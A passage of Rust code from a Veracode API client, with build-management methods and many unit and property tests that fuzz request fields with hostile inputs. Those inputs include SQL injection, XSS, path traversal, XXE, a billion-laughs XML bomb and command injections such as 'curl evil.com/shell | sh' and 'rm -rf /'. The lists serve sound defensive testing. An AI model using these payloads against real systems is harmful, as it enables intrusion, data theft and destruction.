            app_id: app_id.to_string(),
            build_id: None,
            sandbox_id: Some(sandbox_id.to_string()),
        };

        self.get_build_info(&request).await
    }

    /// Get list of all builds for an application
    ///
    /// # Arguments
    ///
    /// * `app_id` - Application ID
    ///
    /// # Returns
    ///
    /// A `Result` containing the build list or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, authentication fails,
    /// or the operation is rejected by the Veracode platform.
    pub async fn get_app_builds(&self, app_id: &str) -> Result<BuildList, BuildError> {
        let request = GetBuildListRequest {
            app_id: app_id.to_string(),
            sandbox_id: None,
        };

        self.get_build_list(&request).await
    }

    /// Get list of builds for a sandbox
    ///
    /// # Arguments
    ///
    /// * `app_id` - Application ID
    /// * `sandbox_id` - Sandbox ID
    ///
    /// # Returns
    ///
    /// A `Result` containing the build list or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, authentication fails,
    /// or the operation is rejected by the Veracode platform.
    pub async fn get_sandbox_builds(
        &self,
        app_id: &str,
        sandbox_id: &str,
    ) -> Result<BuildList, BuildError> {
        let request = GetBuildListRequest {
            app_id: app_id.to_string(),
            sandbox_id: Some(sandbox_id.to_string()),
        };

        self.get_build_list(&request).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::VeracodeConfig;

    #[test]
    fn test_create_build_request() {
        let request = CreateBuildRequest {
            app_id: "123".to_string(),
            version: Some("1.0.0".to_string()),
            lifecycle_stage: Some("In Development (pre-Alpha)".to_string()),
            launch_date: Some("12/31/2024".to_string()),
            sandbox_id: None,
        };

        assert_eq!(request.app_id, "123");
        assert_eq!(request.version, Some("1.0.0".to_string()));
        assert_eq!(
            request.lifecycle_stage,
            Some("In Development (pre-Alpha)".to_string())
        );
    }

    #[test]
    fn test_update_build_request() {
        let request = UpdateBuildRequest {
            app_id: "123".to_string(),
            build_id: Some("456".to_string()),
            version: Some("1.1.0".to_string()),
            lifecycle_stage: Some("Internal or Alpha Testing".to_string()),
            launch_date: None,
            sandbox_id: Some("789".to_string()),
        };

        assert_eq!(request.app_id, "123");
        assert_eq!(request.build_id, Some("456".to_string()));
        assert_eq!(request.sandbox_id, Some("789".to_string()));
    }

    #[test]
    fn test_lifecycle_stage_validation() {
        // Test valid lifecycle stages
        assert!(is_valid_lifecycle_stage("In Development (pre-Alpha)"));
        assert!(is_valid_lifecycle_stage("Internal or Alpha Testing"));
        assert!(is_valid_lifecycle_stage("External or Beta Testing"));
        assert!(is_valid_lifecycle_stage("Deployed"));
        assert!(is_valid_lifecycle_stage("Maintenance"));
        assert!(is_valid_lifecycle_stage("Cannot Disclose"));
        assert!(is_valid_lifecycle_stage("Not Specified"));

        // Test invalid lifecycle stages
        assert!(!is_valid_lifecycle_stage("In Development"));
        assert!(!is_valid_lifecycle_stage("Development"));
        assert!(!is_valid_lifecycle_stage("QA"));
        assert!(!is_valid_lifecycle_stage("Production"));
        assert!(!is_valid_lifecycle_stage(""));

        // Test default
        assert_eq!(default_lifecycle_stage(), "In Development (pre-Alpha)");
        assert!(is_valid_lifecycle_stage(default_lifecycle_stage()));
    }

    #[test]
    fn test_build_error_display() {
        let error = BuildError::BuildNotFound;
        assert_eq!(error.to_string(), "Build not found");

        let error = BuildError::InvalidParameter("Invalid app_id".to_string());
        assert_eq!(error.to_string(), "Invalid parameter: Invalid app_id");

        let error = BuildError::CreationFailed("Build creation failed".to_string());
        assert_eq!(
            error.to_string(),
            "Build creation failed: Build creation failed"
        );
    }

    #[tokio::test]
    async fn test_build_api_method_signatures() {
        async fn _test_build_methods() -> Result<(), Box<dyn std::error::Error>> {
            let config = VeracodeConfig::new("test", "test");
            let client = VeracodeClient::new(config)?;
            let api = client.build_api()?;

            // Test that the method signatures exist and compile
            let create_request = CreateBuildRequest {
                app_id: "123".to_string(),
                version: None,
                lifecycle_stage: None,
                launch_date: None,
                sandbox_id: None,
            };

            // These calls won't actually execute due to test environment,
            // but they validate the method signatures exist
            let _: Result<Build, _> = api.create_build(&create_request).await;
            let _: Result<Build, _> = api.create_simple_build("123", None).await;
            let _: Result<Build, _> = api.create_sandbox_build("123", "456", None).await;
            let _: Result<DeleteBuildResult, _> = api.delete_app_build("123").await;
            let _: Result<Build, _> = api.get_app_build_info("123").await;
            let _: Result<BuildList, _> = api.get_app_builds("123").await;

            Ok(())
        }

        // If this compiles, the methods have correct signatures
        // Test passes if no panic occurs
    }

    #[test]
    fn test_build_status_from_str() {
        assert_eq!(
            BuildStatus::from_string("Incomplete"),
            BuildStatus::Incomplete
        );
        assert_eq!(
            BuildStatus::from_string("Results Ready"),
            BuildStatus::ResultsReady
        );
        assert_eq!(
            BuildStatus::from_string("Pre-Scan Failed"),
            BuildStatus::PreScanFailed
        );
        assert_eq!(
            BuildStatus::from_string("Unknown Status"),
            BuildStatus::Unknown("Unknown Status".to_string())
        );
    }

    #[test]
    fn test_build_status_to_str() {
        assert_eq!(BuildStatus::Incomplete.to_str(), "Incomplete");
        assert_eq!(BuildStatus::ResultsReady.to_str(), "Results Ready");
        assert_eq!(BuildStatus::PreScanFailed.to_str(), "Pre-Scan Failed");
        assert_eq!(
            BuildStatus::Unknown("Custom".to_string()).to_str(),
            "Custom"
        );
    }

    #[test]
    fn test_build_status_deletion_policy_0() {
        // Policy 0: Never delete builds
        assert!(!BuildStatus::Incomplete.is_safe_to_delete(0));
        assert!(!BuildStatus::ResultsReady.is_safe_to_delete(0));
        assert!(!BuildStatus::Failed.is_safe_to_delete(0));
    }

    #[test]
    fn test_build_status_deletion_policy_1() {
        // Policy 1: Delete only safe builds (incomplete, failed, cancelled states)
        assert!(BuildStatus::Incomplete.is_safe_to_delete(1));
        assert!(BuildStatus::NotSubmitted.is_safe_to_delete(1));
        assert!(BuildStatus::PreScanFailed.is_safe_to_delete(1));
        assert!(BuildStatus::Failed.is_safe_to_delete(1));
        assert!(BuildStatus::Cancelled.is_safe_to_delete(1));

        // Should not delete active or successful builds
        assert!(!BuildStatus::ResultsReady.is_safe_to_delete(1));
        assert!(!BuildStatus::ScanInProcess.is_safe_to_delete(1));
        assert!(!BuildStatus::PreScanSuccess.is_safe_to_delete(1));
    }

    #[test]
    fn test_build_status_deletion_policy_2() {
        // Policy 2: Delete any build except Results Ready
        assert!(BuildStatus::Incomplete.is_safe_to_delete(2));
        assert!(BuildStatus::Failed.is_safe_to_delete(2));
        assert!(BuildStatus::ScanInProcess.is_safe_to_delete(2));
        assert!(BuildStatus::PreScanSuccess.is_safe_to_delete(2));

        // Should not delete Results Ready
        assert!(!BuildStatus::ResultsReady.is_safe_to_delete(2));
    }

    #[test]
    fn test_build_status_deletion_policy_invalid() {
        // Invalid policy should default to never delete
        assert!(!BuildStatus::Incomplete.is_safe_to_delete(3));
        assert!(!BuildStatus::Failed.is_safe_to_delete(255));
    }
}

#[cfg(test)]
#[allow(clippy::expect_used)] // Test code: expect is acceptable for test setup
mod proptests {
    use super::*;
    use proptest::prelude::*;

    // Strategy for generating arbitrary build status strings
    fn arbitrary_status_string() -> impl Strategy<Value = String> {
        prop::string::string_regex("[A-Za-z0-9 -]{1,100}")
            .expect("valid regex pattern for arbitrary status string")
    }

    // Strategy for generating valid lifecycle stages
    fn valid_lifecycle_stage_strategy() -> impl Strategy<Value = &'static str> {
        prop::sample::select(LIFECYCLE_STAGES)
    }

    // Strategy for generating invalid lifecycle stages (fuzzing)
    fn invalid_lifecycle_stage_strategy() -> impl Strategy<Value = String> {
        prop_oneof![
            // Empty or whitespace
            Just("".to_string()),
            Just("   ".to_string()),
            // Case variations of valid stages (should fail - case sensitive)
            Just("in development (pre-alpha)".to_string()),
            Just("DEPLOYED".to_string()),
            // Partial matches
            Just("In Development".to_string()),
            Just("Deployed ".to_string()),
            Just(" Maintenance".to_string()),
            // SQL/XSS injection attempts
            Just("'; DROP TABLE builds; --".to_string()),
            Just("<script>alert('xss')</script>".to_string()),
            // Path traversal
            Just("../../etc/passwd".to_string()),
            Just("..\\..\\windows\\system32".to_string()),
            // Control characters
            Just("Deployed\0".to_string()),
            Just("Maintenance\n\r".to_string()),
            // Unicode attacks
            Just("Deployed\u{202E}".to_string()), // Right-to-left override
            Just("Maintenance\u{FEFF}".to_string()), // Zero-width no-break space
            // Very long strings
            prop::string::string_regex(".{256,512}").expect("valid regex pattern for long strings"),
        ]
    }

    proptest! {
        #![proptest_config(ProptestConfig {
            cases: if cfg!(miri) { 5 } else { 1000 },
            failure_persistence: None,
            .. ProptestConfig::default()
        })]

        /// Property: All valid lifecycle stages must be accepted
        #[test]
        fn proptest_valid_lifecycle_stages_always_accepted(
            stage in valid_lifecycle_stage_strategy()
        ) {
            prop_assert!(is_valid_lifecycle_stage(stage));
        }

        /// Property: Invalid lifecycle stages must always be rejected
        #[test]
        fn proptest_invalid_lifecycle_stages_always_rejected(
            stage in invalid_lifecycle_stage_strategy()
        ) {
            prop_assert!(!is_valid_lifecycle_stage(&stage));
        }

        /// Property: BuildStatus parsing must never panic on arbitrary input
        #[test]
        fn proptest_build_status_parsing_never_panics(
            status in arbitrary_status_string()
        ) {
            let result = BuildStatus::from_string(&status);
            // Must always produce a result (never panic)
            prop_assert!(matches!(result, BuildStatus::Unknown(_)) ||
                        matches!(result, BuildStatus::Incomplete) ||
                        matches!(result, BuildStatus::NotSubmitted) ||
                        matches!(result, BuildStatus::SubmittedToEngine) ||
                        matches!(result, BuildStatus::ScanInProcess) ||
                        matches!(result, BuildStatus::PreScanSubmitted) ||
                        matches!(result, BuildStatus::PreScanSuccess) ||
                        matches!(result, BuildStatus::PreScanFailed) ||
                        matches!(result, BuildStatus::PreScanCancelled) ||
                        matches!(result, BuildStatus::PrescanFailed) ||
                        matches!(result, BuildStatus::PrescanCancelled) ||
                        matches!(result, BuildStatus::ScanCancelled) ||
                        matches!(result, BuildStatus::ResultsReady) ||
                        matches!(result, BuildStatus::Failed) ||
                        matches!(result, BuildStatus::Cancelled));
        }

        /// Property: BuildStatus roundtrip (from_string -> to_str) must be consistent for known statuses
        #[test]
        fn proptest_build_status_roundtrip_consistency(
            status in prop::sample::select(vec![
                "Incomplete", "Not Submitted", "Submitted to Engine", "Scan in Process",
                "Pre-Scan Submitted", "Pre-Scan Success", "Pre-Scan Failed", "Pre-Scan Cancelled",
                "Prescan Failed", "Prescan Cancelled", "Scan Cancelled", "Results Ready",
                "Failed", "Cancelled"
            ])
        ) {
            let parsed = BuildStatus::from_string(status);
            let back_to_str = parsed.to_str();
            prop_assert_eq!(back_to_str, status);
        }

        /// Property: Deletion policy 0 must NEVER allow deletion (safety critical)
        #[test]
        fn proptest_deletion_policy_0_never_deletes(
            status in arbitrary_status_string()
        ) {
            let build_status = BuildStatus::from_string(&status);
            prop_assert!(!build_status.is_safe_to_delete(0));
        }

        /// Property: Deletion policy must be monotonic (higher policy = more permissive)
        #[test]
        fn proptest_deletion_policy_monotonicity(
            status in arbitrary_status_string(),
            policy1 in 0u8..=2,
            policy2 in 0u8..=2
        ) {
            let build_status = BuildStatus::from_string(&status);

            // If policy1 allows deletion, policy2 (if higher) should also allow it
            if policy1 <= policy2 && build_status.is_safe_to_delete(policy1) {
                prop_assert!(build_status.is_safe_to_delete(policy2));
            }
        }

        /// Property: Results Ready builds must NEVER be deletable under any valid policy
        #[test]
        fn proptest_results_ready_never_deletable(policy in 0u8..=2) {
            prop_assert!(!BuildStatus::ResultsReady.is_safe_to_delete(policy));
        }

        /// Property: Invalid policies (>2) must default to safe (never delete)
        #[test]
        fn proptest_invalid_deletion_policy_safe_default(
            status in arbitrary_status_string(),
            policy in 3u8..=255
        ) {
            let build_status = BuildStatus::from_string(&status);
            prop_assert!(!build_status.is_safe_to_delete(policy));
        }

        /// Property: Lifecycle stage validation must be consistent
        #[test]
        fn proptest_lifecycle_stage_validation_consistency(
            stage in prop::string::string_regex(".{0,200}")
                .expect("valid regex pattern for lifecycle stage")
        ) {
            let is_valid = is_valid_lifecycle_stage(&stage);

            // If valid, must be in LIFECYCLE_STAGES array
            if is_valid {
                prop_assert!(LIFECYCLE_STAGES.contains(&stage.as_str()));
            }

            // If not in array, must be invalid
            if !LIFECYCLE_STAGES.contains(&stage.as_str()) {
                prop_assert!(!is_valid);
            }
        }
    }
}

#[cfg(test)]
mod api_request_fuzzing_proptests {
    use super::*;
    use proptest::prelude::*;

    // Strategy for generating arbitrary app IDs with malicious patterns
    fn malicious_app_id_strategy() -> impl Strategy<Value = String> {
        prop_oneof![
            // SQL injection patterns
            Just("'; DROP TABLE apps; --".to_string()),
            Just("' OR '1'='1".to_string()),
            Just("1 UNION SELECT * FROM users--".to_string()),
            // XSS patterns
            Just("<script>alert('xss')</script>".to_string()),
            Just("javascript:alert(1)".to_string()),
            Just("\"><script>alert(String.fromCharCode(88,83,83))</script>".to_string()),
            // Path traversal
            Just("../../../etc/passwd".to_string()),
            Just("..\\..\\..\\windows\\system32\\config\\sam".to_string()),
            // Command injection
            Just("; rm -rf /".to_string()),
            Just("| cat /etc/shadow".to_string()),
            Just("& net user hacker password /add".to_string()),
            // Null byte injection
            Just("123\0malicious".to_string()),
            // Format string attacks
            Just("%s%s%s%s%s%s%s%s%s%s".to_string()),
            Just("%n%n%n%n%n".to_string()),
            // LDAP injection
            Just("*)(uid=*))(|(uid=*".to_string()),
            // NoSQL injection
            Just("{\"$ne\": null}".to_string()),
            Just("{\"$gt\": \"\"}".to_string()),
            // Empty/whitespace
            Just("".to_string()),
            Just("   ".to_string()),
            // Very long strings (DoS)
            prop::string::string_regex(".{1000,5000}")
                .expect("valid regex pattern for very long strings"),
            // Unicode normalization attacks
            Just("\u{FEFF}123".to_string()), // Zero-width no-break space
            Just("123\u{200B}".to_string()), // Zero-width space
            Just("\u{202E}123\u{202D}".to_string()), // Right-to-left override
            // Control characters
            Just("123\r\n456".to_string()),
            Just("123\t456\n789".to_string()),
        ]
    }

    // Strategy for malicious version strings
    fn malicious_version_strategy() -> impl Strategy<Value = String> {
        prop_oneof![
            // Path traversal in version
            Just("../../../etc/passwd".to_string()),
            Just("..\\..\\..\\windows\\system32".to_string()),
            // Command injection
            Just("1.0.0; curl evil.com/shell | sh".to_string()),
            Just("1.0`whoami`".to_string()),
            Just("1.0$(reboot)".to_string()),
            // XSS
            Just("<img src=x onerror=alert(1)>".to_string()),
            // Very long version strings
            prop::string::string_regex(".{500,1000}")
                .expect("valid regex pattern for long version strings"),
            // Special characters
            Just("\0\0\0".to_string()),
            Just("'\"\\n\\r\\t".to_string()),
            // Unicode attacks
            Just("\u{FEFF}1.0.0".to_string()),
        ]
    }

    // Strategy for malicious date strings
    fn malicious_date_strategy() -> impl Strategy<Value = String> {
        prop_oneof![
            // Invalid date formats
            Just("2024-13-45".to_string()), // Invalid month/day
            Just("99/99/9999".to_string()),
            Just("00/00/0000".to_string()),
            // SQL injection
            Just("12/31/2024'; DROP TABLE dates; --".to_string()),
            // Format string
            Just("%s%s%s%s".to_string()),
            // Command injection
            Just("12/31/2024; cat /etc/passwd".to_string()),
            // Very long dates
            prop::string::string_regex(".{100,500}")
                .expect("valid regex pattern for long date strings"),
            // Negative values
            Just("-1/-1/-1".to_string()),
            // Integer overflow attempts
            Just("99999999/99999999/99999999".to_string()),
        ]
    }

    proptest! {
        #![proptest_config(ProptestConfig {
            cases: if cfg!(miri) { 5 } else { 500 },
            failure_persistence: None,
            .. ProptestConfig::default()
        })]

        /// Property: CreateBuildRequest construction never panics with malicious inputs
        #[test]
        fn proptest_create_build_request_malicious_input_safety(
            app_id in malicious_app_id_strategy(),
            version in malicious_version_strategy(),
            launch_date in malicious_date_strategy()
        ) {
            // Construction must never panic
            let request = CreateBuildRequest {
                app_id: app_id.clone(),
                version: Some(version.clone()),
                lifecycle_stage: Some("In Development (pre-Alpha)".to_string()),
                launch_date: Some(launch_date.clone()),
                sandbox_id: None,
            };

            // Verify fields stored correctly (no injection/corruption)
            prop_assert_eq!(request.app_id, app_id);
            prop_assert_eq!(request.version, Some(version));
            prop_assert_eq!(request.launch_date, Some(launch_date));
        }

        /// Property: UpdateBuildRequest construction never panics with malicious inputs
        #[test]
        fn proptest_update_build_request_malicious_input_safety(
            app_id in malicious_app_id_strategy(),
            build_id in malicious_app_id_strategy(),
            version in malicious_version_strategy()
        ) {
            let request = UpdateBuildRequest {
                app_id: app_id.clone(),
                build_id: Some(build_id.clone()),
                version: Some(version.clone()),
                lifecycle_stage: None,
                launch_date: None,
                sandbox_id: None,
            };

            prop_assert_eq!(request.app_id, app_id);
            prop_assert_eq!(request.build_id, Some(build_id));
            prop_assert_eq!(request.version, Some(version));
        }

        /// Property: DeleteBuildRequest construction never panics with malicious inputs
        #[test]
        fn proptest_delete_build_request_malicious_input_safety(
            app_id in malicious_app_id_strategy(),
            sandbox_id in malicious_app_id_strategy()
        ) {
            let request = DeleteBuildRequest {
                app_id: app_id.clone(),
                sandbox_id: Some(sandbox_id.clone()),
            };

            prop_assert_eq!(request.app_id, app_id);
            prop_assert_eq!(request.sandbox_id, Some(sandbox_id));
        }

        /// Property: Lifecycle stage validation rejects malicious inputs
        #[test]
        fn proptest_lifecycle_stage_rejects_malicious_input(
            malicious_stage in prop_oneof![
                malicious_app_id_strategy(),
                malicious_version_strategy(),
                Just("'; DROP TABLE stages; --".to_string()),
                Just("<script>alert('xss')</script>".to_string()),
            ]
        ) {
            // Malicious stages must not be validated as correct
            // (unless by extreme chance they match a valid stage exactly)
            let is_valid = is_valid_lifecycle_stage(&malicious_stage);

            if is_valid {
                // If somehow valid, must be in the whitelist
                prop_assert!(LIFECYCLE_STAGES.contains(&malicious_stage.as_str()));
            } else {
                // Most malicious inputs should be rejected
                prop_assert!(!LIFECYCLE_STAGES.contains(&malicious_stage.as_str()));
            }
        }

        /// Property: Build structure handles malicious attributes safely
        #[test]
        fn proptest_build_structure_malicious_attributes(
            key in malicious_version_strategy(),
            value in malicious_app_id_strategy()
        ) {
            let mut build = Build {
                build_id: "123".to_string(),
                app_id: "456".to_string(),
                version: None,
                app_name: None,
                sandbox_id: None,
                sandbox_name: None,
                lifecycle_stage: None,
                launch_date: None,
                submitter: None,
                platform: None,
                analysis_unit: None,
                policy_name: None,
                policy_version: None,
                policy_compliance_status: None,
                rules_status: None,
                grace_period_expired: None,
                scan_overdue: None,
                policy_updated_date: None,
                legacy_scan_engine: None,
                attributes: HashMap::new(),
            };

            // Inserting malicious attributes must not panic
            build.attributes.insert(key.clone(), value.clone());

            // Verify stored correctly without corruption
            prop_assert_eq!(build.attributes.get(&key), Some(&value));
        }

        /// Property: BuildError display never panics with malicious messages
        #[test]
        fn proptest_build_error_display_safety(
            msg in malicious_app_id_strategy()
        ) {
            let errors = vec![
                BuildError::InvalidParameter(msg.clone()),
                BuildError::CreationFailed(msg.clone()),
                BuildError::UpdateFailed(msg.clone()),
                BuildError::DeletionFailed(msg.clone()),
                BuildError::XmlParsingError(msg.clone()),
            ];

            for error in errors {
                // Display must never panic
                let _ = error.to_string();
                let _ = format!("{error}");
            }
        }

        /// Property: BuildStatus Unknown variant handles arbitrary strings safely
        #[test]
        fn proptest_build_status_unknown_variant_safety(
            arbitrary_status in malicious_app_id_strategy()
        ) {
            let status = BuildStatus::Unknown(arbitrary_status.clone());

            // to_str must never panic
            let str_repr = status.to_str();
            prop_assert_eq!(str_repr, arbitrary_status.as_str());

            // Display must never panic
            let _ = status.to_string();
            let _ = format!("{status}");

            // Deletion safety must still work
            let _ = status.is_safe_to_delete(0);
            let _ = status.is_safe_to_delete(1);
            let _ = status.is_safe_to_delete(2);
        }
    }
}

#[cfg(test)]
mod xml_parsing_proptests {
    use super::*;
    use crate::{VeracodeClient, VeracodeConfig};
    use proptest::prelude::*;

    // Strategy for generating malicious XML payloads
    fn malicious_xml_strategy() -> impl Strategy<Value = String> {
        prop_oneof![
            // XML bomb (billion laughs attack) - simplified version
            Just(r#"<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<build build_id="&lol2;" app_id="123"/>"#.to_string()),

            // XXE (External Entity) injection
            Just(r#"<?xml version="1.0"?>
<!DOCTYPE build [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<build build_id="&xxe;" app_id="123"/>"#.to_string()),

            // Malformed/unclosed tags
            Just("<build build_id=\"123\" app_id=\"456\"".to_string()),
            Just("<build build_id=\"123\"><invalid></build>".to_string()),

            // XSS in attributes
            Just(r#"<build build_id="<script>alert('xss')</script>" app_id="123"/>"#.to_string()),
            Just(r#"<build build_id="123" version="&lt;script&gt;alert('xss')&lt;/script&gt;"/>"#.to_string()),

            // SQL injection in attributes
            Just(r#"<build build_id="'; DROP TABLE builds; --" app_id="123"/>"#.to_string()),

            // Path traversal in attributes
            Just(r#"<build build_id="../../etc/passwd" app_id="123"/>"#.to_string()),

            // Control characters and null bytes
            Just("<build build_id=\"123\0\" app_id=\"456\"/>".to_string()),
            Just("<build build_id=\"123\r\n\" app_id=\"456\"/>".to_string()),

            // Unicode attacks
            Just("<build build_id=\"123\u{202E}\" app_id=\"456\"/>".to_string()),

            // Empty/missing required fields
            Just("<build/>".to_string()),
            Just("<build build_id=\"\"/>".to_string()),
            Just("<build app_id=\"\"/>".to_string()),

            // Deeply nested XML
            Just("<a><b><c><d><e><f><g><h><i><j><build build_id=\"123\" app_id=\"456\"/></j></i></h></g></f></e></d></c></b></a>".to_string()),

            // Very long attribute values
            prop::string::string_regex(".{1000,2000}")
                .expect("valid regex pattern for very long XML attributes")
                .prop_map(|s| format!(r#"<build build_id="{s}" app_id="123"/>"#)),
        ]
    }

    proptest! {
        #![proptest_config(ProptestConfig {
            cases: if cfg!(miri) { 5 } else { 500 },
            failure_persistence: None,
            .. ProptestConfig::default()
        })]

        /// Property: XML parsing must never panic on malicious input
        #[test]
        fn proptest_xml_parsing_never_panics_on_malicious_input(
            xml in malicious_xml_strategy()
        ) {
            let config = VeracodeConfig::new("test_id", "test_key");
            let client = VeracodeClient::new(config)
                .expect("valid test client configuration");
            let api = BuildApi::new(client);

            // Should either parse successfully or return an error, never panic
            let result = api.parse_build_info(&xml);
            prop_assert!(result.is_ok() || result.is_err());
        }

        /// Property: XML parsing with error elements must return proper errors
        #[test]
        fn proptest_xml_error_handling(
            error_msg in prop::string::string_regex(".{1,200}")
                .expect("valid regex pattern for error messages")
        ) {
            let xml = format!("<error>{error_msg}</error>");
            let config = VeracodeConfig::new("test_id", "test_key");
            let client = VeracodeClient::new(config)
                .expect("valid test client configuration");
            let api = BuildApi::new(client);

            let result = api.parse_build_info(&xml);

            // Must return an error for error elements
            prop_assert!(result.is_err());
        }

        /// Property: Valid minimal XML must parse successfully
        /// Note: Uses opening/closing tags because parser doesn't handle self-closing <build/> in Event::Empty
        #[test]
        fn proptest_minimal_valid_xml_parsing(
            build_id in "[0-9]{1,10}",
            app_id in "[0-9]{1,10}"
        ) {
            let xml = format!(r#"<build build_id="{build_id}" app_id="{app_id}"></build>"#);
            let config = VeracodeConfig::new("test_id", "test_key");
            let client = VeracodeClient::new(config)
                .expect("valid test client configuration");
            let api = BuildApi::new(client);

            let result = api.parse_build_info(&xml);

            prop_assert!(result.is_ok());
            if let Ok(build) = result {
                prop_assert_eq!(build.build_id, build_id);
                prop_assert_eq!(build.app_id, app_id);
            }
        }

        /// Property: Build list parsing must handle empty lists
        #[test]
        fn proptest_empty_build_list_parsing(
            app_id in "[0-9]{1,10}"
        ) {
            let xml = format!(r#"<buildlist app_id="{app_id}"></buildlist>"#);
            let config = VeracodeConfig::new("test_id", "test_key");
            let client = VeracodeClient::new(config)
                .expect("valid test client configuration");
            let api = BuildApi::new(client);

            let result = api.parse_build_list(&xml);

            prop_assert!(result.is_ok());
            if let Ok(build_list) = result {
                prop_assert_eq!(build_list.app_id, app_id);
                prop_assert_eq!(build_list.builds.len(), 0);
            }
        }

        /// Property: Date parsing must never panic
        #[test]
        fn proptest_date_parsing_safety(
            date_str in prop::string::string_regex(".{0,100}")
                .expect("valid regex pattern for date strings")
        ) {
            // Test that date parsing never panics, even with invalid input
            use chrono::NaiveDate;
            let _ = NaiveDate::parse_from_str(&date_str, "%m/%d/%Y");
            // If we get here without panic, test passes
        }

        /// Property: Boolean parsing in XML must handle arbitrary strings safely
        #[test]
        fn proptest_boolean_parsing_safety(
            bool_str in prop::string::string_regex(".{0,50}")
                .expect("valid regex pattern for boolean strings")
        ) {
            // Test that boolean parsing never panics
            let _ = bool_str.parse::<bool>();
            // If we get here without panic, test passes
        }
    }
}

#[cfg(test)]
#[allow(clippy::expect_used)] // Test code: expect is acceptable for test setup
mod deletion_safety_proptests {
    use super::*;
    use proptest::prelude::*;

    proptest! {
        #![proptest_config(ProptestConfig {
            cases: if cfg!(miri) { 5 } else { 1000 },
            failure_persistence: None,
            .. ProptestConfig::default()
        })]

        /// Property: Policy level 1 must only delete safe states (critical invariant)
        #[test]
        fn proptest_policy_1_only_deletes_safe_states(
            status_str in prop::string::string_regex("[A-Za-z0-9 -]{1,100}")
                .expect("valid regex pattern for status strings")
        ) {
            let status = BuildStatus::from_string(&status_str);
            let is_deletable = status.is_safe_to_delete(1);

            // If deletable under policy 1, must be a safe state
            if is_deletable {
                prop_assert!(matches!(
                    status,
                    BuildStatus::Incomplete
                        | BuildStatus::NotSubmitted
                        | BuildStatus::PreScanFailed
                        | BuildStatus::PreScanCancelled
                        | BuildStatus::PrescanFailed
                        | BuildStatus::PrescanCancelled
                        | BuildStatus::ScanCancelled
                        | BuildStatus::Failed
                        | BuildStatus::Cancelled
                ));
            }
        }

        /// Property: Policy level 2 must never delete ResultsReady (critical invariant)
        #[test]
        fn proptest_policy_2_never_deletes_results_ready(
            _dummy in 0u8..1 // Dummy parameter for proptest macro
        ) {
            prop_assert!(!BuildStatus::ResultsReady.is_safe_to_delete(2));
        }

        /// Property: Unknown statuses under policy 1 must not be deletable (fail-safe)
        #[test]
        fn proptest_unknown_status_safe_default_policy_1(
            unknown_status in prop::string::string_regex("[A-Za-z0-9 ]{1,100}")
                .expect("valid regex pattern for unknown status strings")
                .prop_filter("Must not match known statuses", |s| {
                    !matches!(s.as_str(),
                        "Incomplete" | "Not Submitted" | "Submitted to Engine" | "Scan in Process" |
                        "Pre-Scan Submitted" | "Pre-Scan Success" | "Pre-Scan Failed" | "Pre-Scan Cancelled" |
                        "Prescan Failed" | "Prescan Cancelled" | "Scan Cancelled" | "Results Ready" |
                        "Failed" | "Cancelled"
                    )
                })
        ) {
            let status = BuildStatus::from_string(&unknown_status);

            // Unknown statuses must not be deletable under policy 1 (fail-safe)
            prop_assert!(!status.is_safe_to_delete(1));
        }

        /// Property: ScanInProcess must never be deletable under policy 1 (data integrity)
        #[test]
        fn proptest_scan_in_process_not_deletable_policy_1(
            _dummy in 0u8..1
        ) {
            prop_assert!(!BuildStatus::ScanInProcess.is_safe_to_delete(1));
        }

        /// Property: PreScanSuccess must never be deletable under policy 1 (data preservation)
        #[test]
        fn proptest_prescan_success_not_deletable_policy_1(
            _dummy in 0u8..1
        ) {
            prop_assert!(!BuildStatus::PreScanSuccess.is_safe_to_delete(1));
        }
    }
}
